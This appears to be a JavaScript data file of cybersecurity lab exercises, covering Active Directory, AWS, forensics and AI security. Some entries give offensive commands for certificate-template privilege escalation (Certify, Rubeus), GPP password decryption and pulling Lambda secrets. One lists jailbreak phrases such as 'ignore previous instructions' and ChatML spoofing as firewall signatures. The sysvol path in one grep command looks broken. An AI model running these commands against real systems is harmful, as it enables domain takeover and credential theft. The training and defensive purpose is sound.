                "Access domain controller directories to verify administrative access."
            ],
            commands: "Query templates via Certify:\n.\\Certify.exe find /vulnerable\n\nRequest certificate:\n.\\Certify.exe request /ca:[CA_Name] /template:[Template] /altname:Administrator\n\nRequest TGT:\nRubeus.exe asktgt /user:Administrator /certificate:[Base64_Cert] /ptt",
            mitigation: "Disable template options that allow user-supplied subjects in high-privilege certificate configurations."
        }
    },
    {
        id: 98,
        title: "AWS Lambda Hardcoded Secrets",
        category: "ad-cloud",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Scan AWS Lambda function configurations and code backups to find exposed credentials and hardcoded passwords.",
        guide: {
            objective: "Locate hardcoded API keys and secrets in cloud function files.",
            labSetup: "AWS portal access; Lambda function configurations containing secret environment variables.",
            steps: [
                "Query Lambda functions using AWS CLI tools.",
                "Download Lambda deployment code packages.",
                "Search code files for secret strings.",
                "Retrieve credentials from configuration parameters."
            ],
            commands: "List Lambda functions:\naws lambda list-functions\n\nRetrieve environment variables:\naws lambda get-function --function-name [Function_Name]",
            mitigation: "Avoid hardcoding credentials in Lambda function files; use AWS Secrets Manager or KMS encryption instead."
        }
    },
    {
        id: 99,
        title: "Active Directory GPP Decryption",
        category: "ad-cloud",
        difficulty: "intermediate",
        duration: "2-3 Hours",
        xp: 75,
        description: "Decrypt passwords stored in Active Directory Group Policy Preference files using public AES keys.",
        guide: {
            objective: "Recover plain-text credentials from Active Directory Group Policy files.",
            labSetup: "Domain controller environment; local domain user credentials; GPP configuration XML containing cpassword.",
            steps: [
                "Browse domain controller Sysvol shares to locate Groups Policy XML files.",
                "Locate password parameters (cpassword) in configuration records.",
                "Decrypt the password parameter using the public AES key.",
                "Access target systems using the recovered credentials."
            ],
            commands: "Search GPP XML files:\ngrep -rn \"cpassword\" /let/lib/samba/sysvol/\n\nDecrypt GPP hash:\ngpp-decrypt [cpassword_string]",
            mitigation: "Decommission Group Policy Preferences containing local administrator password mappings (apply MS14-025)."
        }
    },
    {
        id: 100,
        title: "CloudTrail Logs Audit",
        category: "ad-cloud",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Analyze AWS CloudTrail logs using CLI tools to detect indicators of privilege escalation attempts.",
        guide: {
            objective: "Identify privilege escalation attempts inside AWS configurations by analyzing audit logs.",
            labSetup: "Access to AWS console; log directories containing CloudTrail activity records.",
            steps: [
                "Download CloudTrail logs from S3 backup buckets.",
                "Search log events for policy changes (e.g. CreatePolicyVersion, AttachUserPolicy).",
                "Extract user identities and source IPs associated with the event logs.",
                "Document anomalies for security auditing."
            ],
            commands: "Query policy changes via CLI:\naws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=CreatePolicyVersion",
            mitigation: "Enforce real-time alerts on critical IAM modifications using AWS EventBridge and CloudWatch."
        }
    },
    {
        id: 9001,
        title: "Image Steganography Basics",
        category: "forensics",
        difficulty: "beginner",
        duration: "1 Hour",
        xp: 40,
        description: "Hide and extract secret text from within an image file.",
        guide: {
            objective: "Learn to mark images with hidden payloads.",
            labSetup: "Any Linux environment with steghide installed.",
            steps: [
                "Install steghide: sudo apt-get install steghide",
                "Hide a message: steghide embed -cf image.jpg -ef secret.txt",
                "Extract it: steghide extract -sf image.jpg"
            ],
            commands: "steghide embed -cf image.jpg -ef secret.txt",
            mitigation: "Monitor file integrity and look for statistical anomalies in image metadata."
        }
    },
    {
        id: 9002,
        title: "Advanced Malware Graph Analysis",
        category: "reverse-engineering",
        difficulty: "advanced",
        duration: "3 Hours",
        xp: 150,
        description: "Use graph theory to map malware execution flow.",
        guide: {
            objective: "Identify malicious patterns using call graphs.",
            labSetup: "Ghidra or IDA Pro.",
            steps: [
                "Load binary into disassembler.",
                "Generate the function call graph.",
                "Identify central execution hubs."
            ],
            commands: "No specific commands, use GUI tools.",
            mitigation: "Code obfuscation (from a defender perspective to slow analysis)."
        }
    },
    {
        id: 1001,
        title: "AI Autonomous SIEM Log Triage Engine",
        category: "ai-security",
        difficulty: "intermediate",
        duration: "4 Hours",
        xp: 200,
        description: "Build an automated SOC incident triage engine that combines Sigma rules with local LLMs (Llama-3 via Ollama) to classify threats and output MITRE ATT&CK reports.",
        guide: {
            objective: "Automate Tier-1/Tier-2 SOC alert triage by piping raw Sysmon process events through a local LLM for root-cause analysis and automated containment ticketing.",
            labSetup: "Python 3.11, Ollama running llama3:8b locally (ollama run llama3:8b), SQLite, pySigma.",
            steps: [
                "Step 1: Ingest Windows Sysmon JSON telemetry (Event ID 1: Process Creation, Event ID 3: Network Connection).",
                "Step 2: Execute Sigma rule engine (pySigma) to flag initial high-confidence threat triggers.",
                "Step 3: Construct a structured LLM prompt containing ParentImage, CommandLine, User, and file hashes.",
                "Step 4: Query local Ollama API (/api/generate) with format='json' to produce structured incident JSON.",
                "Step 5: Output MITRE technique IDs, threat severity (CRITICAL/HIGH), and 3 immediate containment recommendations."
            ],
            commands: "ollama run llama3:8b\npip install fastapi uvicorn requests pysigma\npython -m uvicorn triage_api:app --reload --port 8000",
            mitigation: "Ensure LLM prompts are isolated and cannot be tainted by untrusted log fields (prevent log injection/jailbreaks). Keep model weights local for data privacy."
        }
    },
    {
        id: 1002,
        title: "ML Command & Control (C2) Beaconing Detector",
        category: "ai-security",
        difficulty: "advanced",
        duration: "5 Hours",
        xp: 250,
        description: "Develop a machine learning network analyzer using Scapy and Isolation Forests to detect covert C2 beaconing callbacks hidden in jittered HTTP/TLS traffic.",
        guide: {
            objective: "Identify periodic outbound callbacks from compromised endpoints communicating with adversary C2 infrastructure (Cobalt Strike, Sliver, Havoc) despite randomized jitter.",
            labSetup: "Python 3.11 with scapy, pandas, scikit-learn, and sample PCAP capture files.",
            steps: [
                "Step 1: Parse raw network PCAP files using Scapy and group packets by (Source IP, Dest IP, Dest Port) session flows.",
                "Step 2: Calculate inter-arrival time deltas (IAT) and payload byte length variance for each flow.",
                "Step 3: Compute mathematical features: Mean Delta, Standard Deviation, Skewness, and Coefficient of Variation.",
                "Step 4: Train an Isolation Forest unsupervised anomaly model on baseline network traffic.",
                "Step 5: Score test flows; flag low-variance flows exhibiting periodic pulse frequencies as suspected C2 beacons."
            ],
            commands: "pip install scapy pandas scikit-learn\npython c2_detector.py --pcap network_capture.pcap --threshold 0.85",
            mitigation: "Implement TLS inspection with JA3/JA4 certificate fingerprinting and enforce egress proxy filtering."
        }
    },
    {
        id: 1003,
        title: "LLM Security Firewall & Prompt Injection Shield",
        category: "ai-security",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 250,
        description: "Construct an inbound security proxy that detects direct/indirect prompt injection, jailbreaks, and ChatML tag spoofing per OWASP LLM01:2025.",
        guide: {
            objective: "Protect production LLM endpoints from prompt injection attacks, system prompt leakage, and Base64-encoded payload smuggling.",
            labSetup: "FastAPI, Regex, Python Transformers or local embedding similarity engine.",
            steps: [
                "Step 1: Set up a FastAPI reverse proxy between the user client and the upstream LLM API.",
                "Step 2: Implement a signature matching engine for known jailbreak heuristics ('ignore previous instructions', 'DAN mode').",
                "Step 3: Add an entropy detector to identify obfuscated Base64/Hex text strings in user inputs.",
                "Step 4: Implement delimiter sanitization to prevent ChatML tag injection (<|im_start|>, ### Instruction).",
                "Step 5: Return a 403 Forbidden with SOC security alert telemetry if a hostile injection vector is confirmed."
            ],
            commands: "pip install fastapi uvicorn pydantic\npython -m uvicorn firewall_proxy:app --port 8080",
            mitigation: "Combine heuristic filters with secondary guardrail models (Llama Guard) and strict output encoding before rendering response content."
        }
    },
    {
        id: 1004,
        title: "Automated Active Directory Attack Path Grapher",
        category: "ai-security",
        difficulty: "advanced",
        duration: "5 Hours",
        xp: 250,
        description: "Build an automated graph intelligence tool that ingests BloodHound Neo4j data and identifies shortest privilege escalation attack paths to Domain Admin.",
        guide: {
            objective: "Automate red team reconnaissance and blue team defensive posture auditing across complex Active Directory forest trusts and ACL misconfigurations.",
            labSetup: "Docker with Neo4j, Python neo4j driver, and bloodhound-python data collector.",
            steps: [
                "Step 1: Deploy a local Neo4j graph database container (docker run -p 7687:7687 neo4j:latest).",
                "Step 2: Collect domain ACLs and session tokens using SharpHound or bloodhound-python.",
                "Step 3: Ingest JSON node objects (Users, Computers, Groups, GPOs) and relationship edges (MemberOf, GenericAll, WriteDacl, Owns).",
                "Step 4: Execute Cypher graph queries to calculate the shortest path from any non-privileged user to the 'Domain Admins' group.",
                "Step 5: Generate an automated remediation report highlighting the exact ACL permissions to revoke."
            ],
            commands: "docker run -d -p 7474:7474 -p 7687:7687 -e NEO4J_AUTH=neo4j/password neo4j\npip install neo4j\npython ad_graph_auditor.py --target-group 'Domain Admins'",
            mitigation: "Enforce Tiered Active Directory administration models and eliminate nested GenericAll permissions on privileged group objects."
        }
    },
    {
        id: 1005,
        title: "Dark Web Threat Intelligence & Telegram Alert Scraper",
        category: "ai-security",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 180,
        description: "Create an automated threat intelligence scraper that routes through Tor SOCKS5 proxy to monitor leak sites for brand keywords and dispatches Telegram alerts.",
        guide: {
            objective: "Proactively discover leaked credentials, exposed database dumps, and active ransomware victim announcements targeting your organization on dark web forums.",
            labSetup: "Local Tor daemon (SOCKS5 proxy on 127.0.0.1:9050), Python Stem, Requests[socks], Telegram Bot API token.",
            steps: [
                "Step 1: Start the Tor daemon service locally to enable SOCKS5 onion routing.",
                "Step 2: Configure Python requests session to route all HTTP traffic through socks5h://127.0.0.1:9050.",
                "Step 3: Fetch HTML contents of targeted ransomware leak portals (.onion URLs) and paste sites.",
                "Step 4: Parse page text with BeautifulSoup and match against target organization keyword list and domain regex.",
                "Step 5: When a match is found, extract post timestamp, description, and fire a real-time alert via Telegram Bot webhook."
            ],
            commands: "sudo systemctl start tor\npip install 'requests[socks]' stem beautifulsoup4\npython darkweb_monitor.py --keywords 'mycompany.com,executive_name'",
            mitigation: "Maintain active credential rotation policies and deploy honeytokens across internal infrastructure to verify breach authenticity."
        }
    },
    {
        id: 1006,
        title: "Automated Malware Triage & Dynamic YARA Extractor",
        category: "ai-security",
        difficulty: "advanced",
        duration: "4 Hours",
        xp: 220,
        description: "Build an automated static/dynamic PE binary analysis pipeline that inspects import tables, extracts unique byte sequences with Capstone, and generates tailored YARA detection rules.",
        guide: {
            objective: "Speed up malware incident triage by automatically analyzing suspicious Windows PE executables, extracting unique code strings, and synthesizing production YARA signatures.",
            labSetup: "Python 3.11 with pefile, capstone, yara-python, and isolated test sandbox directory.",
            steps: [
                "Step 1: Parse the target binary's Portable Executable (PE) headers using pefile to inspect sections (.text, .rdata, .data) and calculate section entropy.",
                "Step 2: Extract the Import Address Table (IAT) to flag suspicious API calls (VirtualAlloc, WriteProcessMemory, CreateRemoteThread).",
                "Step 3: Disassemble executable sections using Capstone engine to locate unique opcode sequences.",
                "Step 4: Extract meaningful ASCII and Wide strings, filtering out common Microsoft runtime libraries.",
                "Step 5: Assemble extracted opcodes and strings into a synthesized, syntactically valid YARA detection rule file."
            ],
            commands: "pip install pefile capstone yara-python\npython auto_yara_generator.py --sample suspicious_malware.bin --output threat.yar",
            mitigation: "Integrate generated YARA signatures into endpoint detection and response (EDR) agents and email gateway scanners."
        }
    }
];
